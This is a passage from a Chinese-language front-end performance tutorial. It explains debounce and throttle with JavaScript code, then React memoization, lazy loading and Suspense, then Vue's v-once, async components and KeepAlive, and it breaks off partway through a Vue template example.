等）导致性能问题的核心策略。它们的目标都是限制事件处理函数被执行的频率，从而减少不必要的、昂贵的计算、DOM 操作或网络请求（如搜索建议），提升页面响应性和流畅度。</p><p><strong>防抖（Debounce）</strong></p><p>核心思想：“等一等，等你消停了再说”</p><p>工作原理：</p><ul><li>当事件连续触发时，防抖函数不会立即执行。</li><li>它会设置一个等待计时器（timer）。</li><li>如果在等待时间（delay） 内，事件再次被触发，则清除之前的计时器，并重新开始计时。</li><li>只有在事件停止触发，并且等待时间 delay 毫秒过去之后，目标函数才会执行一次。</li></ul><p>实现（简化版）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">func, delay</span>) &#123;<br>  <span class="hljs-keyword">let</span> timeoutId; <span class="hljs-comment">// 用于存储计时器ID</span><br><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) &#123; <span class="hljs-comment">// 返回包装后的函数</span><br>    <span class="hljs-built_in">clearTimeout</span>(timeoutId); <span class="hljs-comment">// 每次触发都清除之前的计时器</span><br>    timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123; <span class="hljs-comment">// 设置新的计时器</span><br>      func.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args); <span class="hljs-comment">// 等待delay后执行原函数</span><br>    &#125;, delay);<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 使用示例：搜索框输入防抖</span><br><span class="hljs-keyword">const</span> searchInput = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;search&#x27;</span>);<br><span class="hljs-keyword">const</span> fetchSuggestions = <span class="hljs-title function_">debounce</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">query</span>) &#123;<br>  <span class="hljs-comment">// 发送请求获取搜索建议...</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Fetching suggestions for:&#x27;</span>, query);<br>&#125;, <span class="hljs-number">300</span>); <span class="hljs-comment">// 延迟300ms</span><br><br>searchInput.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>  <span class="hljs-title function_">fetchSuggestions</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>); <span class="hljs-comment">// 使用防抖后的函数</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>节流（Throttle）</strong></p><p>核心思想：“不管你怎么闹，我固定时间只做一次”。</p><p>工作原理：</p><ul><li>当事件连续触发时，节流函数会按照固定的时间间隔（delay） 执行目标函数。</li><li>它保证在 delay 毫秒内，目标函数最多只执行一次。</li><li>有两种常见实现方式：<ul><li>计时器方式： 第一次触发立即执行并开启计时器，在计时器结束前忽略后续触发。计时器结束后，再响应下一次触发。</li><li>时间戳方式： 记录上次执行的时间戳 lastExec。每次触发时，检查当前时间与 lastExec 的差值是否大于 delay。如果大于，则执行函数并更新 lastExec；否则忽略。</li></ul></li></ul><p>实现（时间戳方式 - 更精确控制首次和最后一次）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">throttle</span>(<span class="hljs-params">func, delay</span>) &#123;<br>  <span class="hljs-keyword">let</span> lastExec = <span class="hljs-number">0</span>; <span class="hljs-comment">// 上次执行的时间戳</span><br>  <span class="hljs-keyword">let</span> timeoutId; <span class="hljs-comment">// 可选，用于处理尾随调用（如果需要）</span><br><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) &#123;<br>    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(); <span class="hljs-comment">// 当前时间戳</span><br>    <span class="hljs-keyword">const</span> timeSinceLastExec = now - lastExec;<br><br>    <span class="hljs-keyword">if</span> (timeSinceLastExec &gt;= delay) &#123;<br>      <span class="hljs-comment">// 距离上次执行已超过delay，立即执行</span><br>      func.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);<br>      lastExec = now;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 可选：如果希望在停止触发后还能执行一次（尾随调用）</span><br>      <span class="hljs-comment">// 清除之前可能设置的尾随计时器</span><br>      <span class="hljs-built_in">clearTimeout</span>(timeoutId);<br>      <span class="hljs-comment">// 设置新的计时器，在剩余时间后执行</span><br>      timeoutId = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>        func.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);<br>        lastExec = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(); <span class="hljs-comment">// 更新执行时间</span><br>      &#125;, delay - timeSinceLastExec);<br>    &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 使用示例：滚动事件节流</span><br><span class="hljs-keyword">const</span> handleScroll = <span class="hljs-title function_">throttle</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 检查是否滚动到底部、更新UI等...</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Handling scroll...&#x27;</span>);<br>&#125;, <span class="hljs-number">250</span>); <span class="hljs-comment">// 最多每250ms执行一次</span><br><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;scroll&#x27;</span>, handleScroll);<br></code></pre></td></tr></table></figure><p><strong>防抖 vs 节流：关键区别总结</strong></p><table><thead><tr><th align="left">特性</th><th align="left">防抖 (Debounce)</th><th align="left">节流 (Throttle)</th></tr></thead><tbody><tr><td align="left">核心目标</td><td align="left">在事件停止触发后执行一次</td><td align="left">固定间隔执行一次，不管触发频率多高</td></tr><tr><td align="left">执行时机</td><td align="left">等待期 (delay) 结束后执行</td><td align="left">间隔期 (delay) 开始或结束时执行</td></tr><tr><td align="left">适用场景</td><td align="left">关注最终状态 (停止输入、停止调整大小)</td><td align="left">关注过程状态 (滚动位置、鼠标位置)</td></tr><tr><td align="left">效果</td><td align="left">密集触发只执行一次 (最后那次)</td><td align="left">密集触发按固定频率执行多次</td></tr></tbody></table><h1 id="四、应用级优化策略"><a href="#四、应用级优化策略" class="headerlink" title="四、应用级优化策略"></a>四、应用级优化策略</h1><h2 id="4-1-框架专项优化"><a href="#4-1-框架专项优化" class="headerlink" title="4.1 框架专项优化"></a>4.1 框架专项优化</h2><h3 id="React：Memoization、懒加载组件、并发模式（Suspense）"><a href="#React：Memoization、懒加载组件、并发模式（Suspense）" class="headerlink" title="React：Memoization、懒加载组件、并发模式（Suspense）"></a>React：Memoization、懒加载组件、并发模式（Suspense）</h3><p><strong>Memoization（记忆化）</strong></p><p>核心目标：避免不必要的组件重渲染</p><p>实现机制：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. React.memo (组件级记忆)</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MemoizedComponent</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">MyComponent</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-comment">/* 仅当props变更时重渲染 */</span><br>  &#125;,<br>  <span class="hljs-function">(<span class="hljs-params">prevProps, nextProps</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 自定义比较逻辑（非必须）</span><br>    <span class="hljs-keyword">return</span> prevProps.<span class="hljs-property">id</span> === nextProps.<span class="hljs-property">id</span>;<br>  &#125;<br>);<br><br><span class="hljs-comment">// 2. useMemo (值记忆)</span><br><span class="hljs-keyword">const</span> expensiveValue = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">computeExpensiveValue</span>(a, b);<br>&#125;, [a, b]); <span class="hljs-comment">// 依赖项变化时重新计算</span><br><br><span class="hljs-comment">// 3. useCallback (函数记忆)</span><br><span class="hljs-keyword">const</span> handleClick = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">doSomething</span>(a, b);<br>&#125;, [a, b]); <span class="hljs-comment">// 依赖不变时返回相同函数引用</span><br></code></pre></td></tr></table></figure><p>优化场景：</p><ul><li>父组件频繁渲染但子组件props未变化</li><li>计算成本高的数据推导</li><li>作为依赖项的函数&#x2F;对象（避免下游useEffect无效触发）</li></ul><p><strong>懒加载组件（Code Splitting）</strong></p><p>核心目标：减少首屏JS体积</p><p>实现方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. React.lazy + Suspense 基础用法</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductList</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ProductList&#x27;</span>));<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ProductList</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 2. 路由级懒加载 (React Router v6)</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createBrowserRouter</span>([<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;/products&quot;</span>,<br>    <span class="hljs-attr">element</span>: (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">PageSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">ProductsPage</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>    ),<br>    <span class="hljs-attr">loader</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&quot;./pages/Products&quot;</span>) <span class="hljs-comment">// 并行加载</span><br>  &#125;<br>]);<br></code></pre></td></tr></table></figure><p><strong>并发模式（Concurrent Mode）与 Suspense</strong></p><p>核心能力：可中断渲染与优先级调度</p><p>技术组合：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. createRoot 启用并发模式</span><br><span class="hljs-keyword">import</span> &#123; createRoot &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-dom/client&#x27;</span>;<br><span class="hljs-title function_">createRoot</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)).<span class="hljs-title function_">render</span>(<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span></span>);<br><br><span class="hljs-comment">// 2. Suspense 数据获取</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProfilePage</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ProfileSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ProfileDetails</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 3. startTransition 保持UI响应</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SearchBox</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [keywords, setKeywords] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>  <span class="hljs-keyword">const</span> [results, setResults] = <span class="hljs-title function_">useState</span>([]);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    <span class="hljs-title function_">setKeywords</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>); <span class="hljs-comment">// 立即更新输入框</span><br>    <span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> &#123;      <span class="hljs-comment">// 延迟计算搜索结果</span><br>      <span class="hljs-title function_">setResults</span>(<span class="hljs-title function_">computeResults</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>));<br>    &#125;);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>并发优势：</p><table><thead><tr><th align="left">传统模式</th><th align="left">并发模式</th></tr></thead><tbody><tr><td align="left">渲染阻塞用户输入</td><td align="left">高优先级操作（如输入）可中断渲染</td></tr><tr><td align="left">数据加载完成前显示空白</td><td align="left">Suspense提供加载态占位</td></tr><tr><td align="left">组件树全量更新</td><td align="left">部分子树独立更新</td></tr></tbody></table><p><strong>综合优化效果对比</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 优化前组件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">ProductPage</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> [products] = <span class="hljs-title function_">fetchAllProducts</span>(); <span class="hljs-comment">// 同步阻塞</span><br>  <br>  <span class="hljs-keyword">return</span> products.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductCard</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;p&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;computeDetails&#125;</span> // <span class="hljs-attr">复杂计算</span></span></span><br><span class="hljs-tag"><span class="language-xml">    /&gt;</span></span><br>  ))<br>&#125;<br><br><span class="hljs-comment">// 优化后实现</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">OptimizedProductPage</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-comment">// 1. 数据异步加载</span><br>  <span class="hljs-keyword">const</span> [products] = <span class="hljs-title function_">use</span>(fetchProductsResource); <span class="hljs-comment">// Suspense兼容</span><br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Search</span> /&gt;</span> &#123;/* 包含startTransition的输入框 */&#125;</span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">GridSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;product-grid&quot;</span>&gt;</span></span><br><span class="language-xml">          &#123;products.map(p =&gt; (</span><br><span class="language-xml">            // 2. 组件记忆化</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">MemoizedProductCard</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;p.id&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;p&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">              // <span class="hljs-attr">3.</span> <span class="hljs-attr">事件回调记忆化</span></span></span><br><span class="hljs-tag"><span class="language-xml">              <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;useCallback(()</span> =&gt;</span> </span><br><span class="language-xml">                computeDetails(p.id), [p.id]</span><br><span class="language-xml">              )&#125;</span><br><span class="language-xml">            /&gt;</span><br><span class="language-xml">          ))&#125;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      &#123;/* 4. 异步加载推荐模块 */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">RecommendPlaceholder</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">LazyRecommendSection</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  )<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Vue：v-once、异步组件、KeepAlive"><a href="#Vue：v-once、异步组件、KeepAlive" class="headerlink" title="Vue：v-once、异步组件、KeepAlive"></a>Vue：v-once、异步组件、KeepAlive</h3><p><strong>v-once：静态内容优化</strong></p><p>核心作用：标记元素&#x2F;组件只渲染一次，跳过后续更新</p><p>实现原理：</p><ul><li>编译阶段识别静态节点树</li><li>创建DOM后解除响应式绑定</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;template&gt;<br>  &lt;!-- 静态头部 --&gt;<br>  &lt;header v-once&gt;<br>    &lt;h1&gt;&#123;&#123; title &#125;&#125;&lt;/h1&gt; &lt;!-- 仅首次渲染 --&gt;<br>    &lt;nav&gt;...&lt;/nav&gt;<br>  &lt;/header&gt;<br>  <br>  &lt;!-- 动态内容 --&gt;<br>  &lt;main&gt;<br>    &#123;&#123; dynamicContent &#125;&#125; &lt;!-- 每次更新 --&gt;<br>  &lt;/main&gt;<br>&lt;/template&gt;<br><br>&lt;script&gt;<br>export default &#123;<br>  data() &#123;<br>    return &#123;<br>      title: &#x27;永久标题&#x27;, // 初始值锁定<br>      dynamicContent: &#x27;变化内容&#x27;<br>    &#125;<br>  &#125;<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>异步组件：按需加载</strong></p><p>核心方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. 基础异步组件</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AsyncPopup</span> = <span class="hljs-title function_">defineAsyncComponent</span>(<span class="hljs-function">() =&gt;</span> <br>  <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./Popup.vue&#x27;</span>)<br>)<br><br><span class="hljs-comment">// 2. 高级配置（加载状态/超时/错误处理）</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AsyncCart</span> = <span class="hljs-title function_">defineAsyncComponent</span>(&#123;<br>  <span class="hljs-attr">loader</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ShoppingCart.vue&#x27;</span>),<br>  <span class="hljs-attr">loadingComponent</span>: <span class="hljs-title class_">LoadingSpinner</span>,<br>  <span class="hljs-attr">errorComponent</span>: <span class="hljs-title class_">ErrorDisplay</span>,<br>  <span class="hljs-attr">delay</span>: <span class="hljs-number">200</span>,  <span class="hljs-comment">// 延迟显示loading</span><br>  <span class="hljs-attr">timeout</span>: <span class="hljs-number">3000</span> <span class="hljs-comment">// 超时时间</span><br>&#125;)<br></code></pre></td></tr></table></figure><p>路由级分割：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Vue Router配置</span><br><span class="hljs-keyword">const</span> routes = [<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/dashboard&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: &quot;dashboard&quot; */</span> <span class="hljs-string">&#x27;./Dashboard.vue&#x27;</span>),<br>    <span class="hljs-attr">children</span>: [<br>      &#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;analytics&#x27;</span>,<br>        <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./Analytics.vue&#x27;</span>) <span class="hljs-comment">// 嵌套异步</span><br>      &#125;<br>    ]<br>  &#125;<br>]<br></code></pre></td></tr></table></figure><p><strong>KeepAlive：组件缓存</strong></p><p>核心能力：缓存非活动组件实例，避免重复渲染</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Vue">&lt;template&gt;<br>  &lt;component :is=&quot;currentTab&quot;&gt;<br>    &lt;!-- 动态切换组件 --&gt;<br>  &lt;/component&gt;<br>  <br>  &lt;KeepAlive <br>    :include=&quot;[&#x27;UserProfile&#x27;, &#x27;Settings&#x27;]&quot; <br>    :max=&quot;5&quot;<br>  &gt;<br>    &lt;component :is=&quot;activeComponent&quot; /&gt;<br>  &lt;/KeepAlive&gt;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure><p>生命周期控制：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-title function_">activated</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 组件被激活时调用（从缓存恢复）</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">fetchData</span>()<br>  &#125;,<br>  <span class="hljs-title function_">deactivated</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 组件被停用时调用（进入缓存）</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">clearTimers</span>()<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>综合优化示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs Vue">&lt;template&gt;<br>  &lt;!-- 静态框架 --&gt;<br>  &lt;div v-once class=&quot;app-frame&quot;&gt;<br>    &lt;AppHeader /&gt;<br>    &lt;AppNav /&gt;<br>  &lt;/div&gt;<br>  <br>  &lt;!-- 动态区域 --&gt;<br>  &lt;RouterView v-slot=&quot;&#123; Component &#125;&quot;&gt;<br>    &lt;KeepAlive include=&quot;ProductList,UserProfile&quot;&gt;<br>      